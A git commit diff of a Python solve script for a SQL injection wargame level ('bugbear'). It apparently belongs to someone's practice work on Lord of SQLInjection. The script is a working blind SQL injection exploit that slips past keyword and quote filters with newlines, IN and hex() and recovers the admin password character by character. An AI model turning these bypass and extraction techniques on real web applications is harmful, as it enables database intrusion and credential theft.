46ea0a3904b2e4383b38b6f62102850ce0f0ca18
yoobi <thisisyoobi@gmail.com>
2024-01-11 23:00:52 +0900

    bugbear clear

--- LOS/13_bugbear/ex.py
+++ LOS/13_bugbear/ex.py
@@ -1,3 +1,12 @@
+#!/usr/bin/env python3
+
+'''
+# Summary
+- we can use IN instead of =
+- we can use hex() to bypass the single quote filter
+'''
+
+
 import requests
 import string
 
@@ -24,9 +33,21 @@ print("[+] Get pw Length : " + str(pw_len))
 for idx in range(1, pw_len + 1):
     for i in string_data:
         data = "?no=1%0a||%0aid%0ain%0a(\"admin\")%0a%26%26%0ahex(mid(pw,{},1))%0ain%0a(hex({}))%23".format(idx,ord(i))
+        print(data)
         response = requests.get(url + data, headers=header)
         if response.text.find("Hello admin") != -1:
             pw = pw + i
             print("[*] Finding... : " + pw)
             break
 print("[+] Found pw : " + pw)
+
+payload = "?pw="+pw
+
+response = requests.get(url + payload, headers=header)
+
+result = response.text
+if result.find("Clear!") != -1:
+    end = result.split("Clear!")[0].split("<h2>")[1]
+    if end.find("admin") != -1:
+        end = result.split("Clear!")[0].split("<h2>")[2]
+    print(end+"Clear!")
